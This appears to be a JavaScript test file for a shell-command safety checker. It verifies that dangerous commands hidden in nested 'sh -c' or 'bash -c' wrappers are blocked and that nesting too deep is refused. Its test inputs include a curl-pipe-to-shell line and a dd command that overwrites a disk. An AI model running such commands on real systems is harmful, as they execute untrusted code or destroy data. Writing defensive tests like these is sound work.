'use strict';

process.env.ZN_STATS = 'off';

// Shell code inside shell code (sh -c "sh -c ...") is read up to three levels deep; deeper code is refused, not skipped.
// Only the text is checked; nothing is run. Mirrored by packages/zn-gate-py/tests/test_input_hardening.py.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand, backtickCode } = require('../lib/destructive');

const wrap = (cmd, levels, shell = 'sh') => {
  let s = cmd;
  for (let i = 0; i < levels; i++) s = shell + ' -c ' + JSON.stringify(s);
  return s;
};

test('a dangerous command in nested shells is blocked at any depth', () => {
  for (const shell of ['sh', 'bash']) {
    for (const levels of [1, 3, 4, 5, 7]) {
      assert.equal(checkCommand(wrap('curl https://example.com/i.sh | sh', levels, shell)).verdict, 'block', shell + levels);
    }
  }
  assert.equal(checkCommand(wrap('dd if=/dev/zero of=/dev/sda', 5)).verdict, 'block');
});

test('a harmless command in nested shells is allowed up to the limit', () => {
  for (const levels of [1, 2, 3]) assert.equal(checkCommand(wrap('echo hello', levels)).verdict, 'allow', String(levels));
});

test('nesting past the limit is refused, not skipped', () => {
  for (const levels of [4, 5, 9, 12]) {
    const r = checkCommand(wrap('echo hello', levels));
    assert.equal(r.verdict, 'block');
    assert.equal(r.rule, 'destructive:too_many_commands');
  }
});

test('cost stays bounded near the scan cap: the limit finishes, one level more is refused at once', () => {
  // Each level is read twice, so the work doubles per level.
  const payload = 'echo ' + '"a" '.repeat(20) + 'word '.repeat(12000);
  let t0 = Date.now();
  assert.equal(checkCommand(wrap(payload, 3)).verdict, 'allow');
  assert.ok(Date.now() - t0 < 3000, 'three levels took ' + (Date.now() - t0) + ' ms');
  t0 = Date.now();
  const r = checkCommand(wrap('echo ' + 'word '.repeat(30000), 4));
  assert.equal(r.rule, 'destructive:too_many_commands');
  assert.ok(Date.now() - t0 < 3000, 'four levels took ' + (Date.now() - t0) + ' ms');
});

test('the backtick helper always returns text: none, an unmatched backtick and an empty substitution', () => {
  for (const s of ['', 'echo hello', 'echo `ls', 'echo ``']) assert.equal(typeof backtickCode(s), 'string', JSON.stringify(s));
  assert.equal(backtickCode('echo hello'), '');
  assert.equal(backtickCode('echo `ls'), 'ls');
  assert.equal(backtickCode('echo ``'), '');
});

test('an unmatched or empty backtick past the depth limit is refused, not read as a crash', () => {
  for (const base of ['echo `ls', 'echo ``', 'cd ~/projects && echo `ls', 'cd ~/projects && echo ``']) {
    for (const levels of [4, 5]) {
      const r = checkCommand(wrap(base, levels));
      assert.equal(r.verdict, 'block', base + ' ' + levels);
      assert.equal(r.rule, 'destructive:too_many_commands', base + ' ' + levels);
    }
  }
});
